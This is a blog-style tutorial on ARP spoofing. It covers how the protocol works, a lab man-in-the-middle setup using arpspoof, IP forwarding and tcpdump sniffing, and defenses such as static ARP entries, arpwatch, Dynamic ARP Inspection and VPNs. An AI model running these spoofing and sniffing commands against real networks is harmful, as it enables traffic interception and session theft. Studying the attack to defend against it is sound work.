---
title: "Learning ARP Spoofing Through Theory and Practice"
date: 2025-04-28T21:33:35+09:00
draft: false
description: "Explore the principles of ARP spoofing attacks that exploit ARP protocol vulnerabilities, practical implementation methods, and defense techniques."
tags:
    [
        "network security",
        "ARP spoofing",
        "hacking",
        "security",
        "networking",
        "penetration testing",
        "man-in-the-middle",
        "MITM",
        "packet sniffing",
    ]
---

## Introduction

ARP spoofing is an attack technique that has been studied in the network security field for a long time. This attack aims to intercept or modify network traffic by exploiting the structural limitations of the ARP protocol. In this article, we will systematically cover the basic concepts of the ARP protocol, the operational principles of ARP spoofing, actual attack implementation, and methods to defend against it.

## What is the ARP Protocol?

ARP (Address Resolution Protocol) is a protocol responsible for address translation between the network layer (IP) and the data link layer (MAC). Simply put, to communicate on an IP network, you need to know not only the target's IP address but also its MAC address. This is where ARP comes in.

The operation is simple. When a host knows the destination IP address but not the MAC address, it broadcasts an ARP request on the network, asking the host with that IP to share its MAC address. The corresponding host then sends back an ARP reply containing its MAC address.

ARP is a simple protocol based on trust, which fundamentally does not perform authentication or integrity verification. This is precisely what makes ARP spoofing possible.

For more details, refer to [How the ARP Protocol Works](how-arp-protocol-works).

## Principles of ARP Spoofing

ARP spoofing exploits the vulnerabilities of the ARP protocol. An attacker sends falsified ARP responses on the network to manipulate the target host's ARP table. As a result, the target trusts the attacker's MAC address and sends all traffic to the attacker.

### Detailed Explanation by Spoofing Method

1. **One-way ARP Spoofing Targeting the Victim**  
   The attacker deceives the target host into believing that the MAC address associated with the gateway's IP address is their own. The target then mistakes the attacker for the gateway and sends traffic to them.

    ```bash
    sudo arpspoof -i <interface> -t <target_ip> -r <gateway_ip>
    ```

2. **One-way ARP Spoofing Targeting the Gateway**  
   Conversely, the attacker approaches the gateway and claims that the MAC address for the target host's IP is their own. In this case, the gateway recognizes the attacker as the target host.

    ```bash
    sudo arpspoof -i <interface> -t <gateway_ip> -r <target_ip>
    ```

3. **Bidirectional ARP Spoofing**  
   In an actual attack, both the target and the gateway must be deceived simultaneously for complete traffic interception. To achieve this, ARP spoofing is performed in both directions.
    ```bash
    sudo arpspoof -i <interface> -t <target_ip> -r <gateway_ip>
    sudo arpspoof -i <interface> -t <gateway_ip> -r <target_ip>
    ```

This way, all communication between the target and the gateway passes through the attacker. The attacker can use this to intercept and manipulate packets.

## Practical Implementation

### Test Environment

-   **Attacker**: Ubuntu 24.04 (IP: 192.168.1.10)
-   **Target**: Windows 10 (IP: 192.168.1.11)
-   **Gateway**: 192.168.1.1
-   All devices on the same subnet
-   **Note**: ARP spoofing is only possible within the same physical network. It is not possible on different subnets or over the internet.

### Installing dsniff

We will use the dsniff package as our ARP spoofing tool. The installation command is as follows:

```bash
sudo apt-get install dsniff
```

dsniff includes various network attack tools such as arpspoof, dnsspoof, macof, and more.

### Executing ARP Spoofing

We'll implement a complete Man-in-the-Middle (MITM) attack through bidirectional spoofing.

```bash
sudo arpspoof -i eth0 -t 192.168.1.11 -r 192.168.1.1
sudo arpspoof -i eth0 -t 192.168.1.1 -r 192.168.1.11
```

### Verifying ARP Table Manipulation

On the target PC, you can check the ARP table with the following command:

```bash
arp -a
```

If the MAC address linked to the gateway IP has been modified to the attacker's MAC address, the spoofing has been successful.

### Enabling IP Forwarding

Even if ARP spoofing is successful, traffic will be disrupted if the attacker doesn't properly relay the packets. To prevent this, the attacker must forward incoming packets to their legitimate destination.

```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

> If forwarding is not enabled, an unintended Denial of Service (DoS) attack may occur.

### Packet Sniffing

You can use tcpdump to eavesdrop on packets.

```bash
sudo apt-get install tcpdump
```

```bash
sudo tcpdump -i eth0 -n -A host 192.168.1.11
```

-   `-n`: Don't convert IP addresses to DNS names
-   `-A`: Display packet content as ASCII

Alternatively, in a GUI environment, you can use Wireshark for more intuitive packet analysis.

## Possible Attacks Through ARP Spoofing

ARP spoofing enables man-in-the-middle attacks. Specifically, these include:

-   **HTTP Traffic Manipulation**  
    Web pages can be altered or malicious scripts can be injected.

-   **DNS Spoofing**  
    DNS responses can be forged to redirect users to malicious sites.

-   **Unencrypted Protocol Attacks**  
    Information from unencrypted protocols like FTP, SMTP, POP3 can be intercepted or manipulated.

-   **Cookie Theft and Session Hijacking**  
    Web application session cookies can be captured to hijack login sessions.

## ARP Spoofing Defense Methods

There are several ways to defend against ARP spoofing. Beyond simply protecting the ARP table, methods to detect and block abnormal ARP changes on the network are necessary.

1. **Static ARP Table Configuration**  
   Adding static ARP entries: Add static entries to the ARP table of specific devices (e.g., gateway) to prevent ARP responses from being altered. This ensures that even if an attacker sends fake ARP responses, the ARP table remains unchanged.

    ```bash
    sudo arp -s <target_ip> <static_mac_address>
    ```

2. **Using ARP Monitoring Tools**  
   Tools that monitor ARP table changes in real-time can detect ARP spoofing. For example, arpwatch tracks ARP changes on the network and can detect abnormal changes.
   Installation and execution:

    ```bash
    sudo apt-get install arpwatch
    sudo arpwatch -i <interface>
    ```

3. **Utilizing Network Switch Security Features**

    - **Dynamic ARP Inspection (DAI)**: Configure switches to inspect ARP responses and only allow legitimate ones. This method can block ARP spoofing attacks in real-time.
    - **DHCP Snooping**: Verify IP and MAC information from DHCP servers to prevent ARP spoofing. The DHCP snooping feature monitors DHCP requests within the network and blocks invalid ARP responses.

4. **Using VPNs**  
   Encrypted traffic: Using a VPN to encrypt network traffic renders ARP spoofing attacks ineffective. Encrypted traffic prevents attackers from reading or modifying packet contents.  
   Configuration example: Set up VPN protocols like OpenVPN or WireGuard to protect the network through encrypted tunnels.

5. **Implementing Intrusion Detection Systems (IDS)/Intrusion Prevention Systems (IPS)**  
   IDS/IPS can detect abnormal traffic on the network and block it in real-time. When an ARP spoofing attack occurs, an IDS detects it and sends alerts, or an IPS blocks the traffic.

## Conclusion

ARP spoofing is an important technique in network attacks, allowing attackers to eavesdrop on or modify network traffic. Network administrators must understand these threats and establish appropriate defense measures.
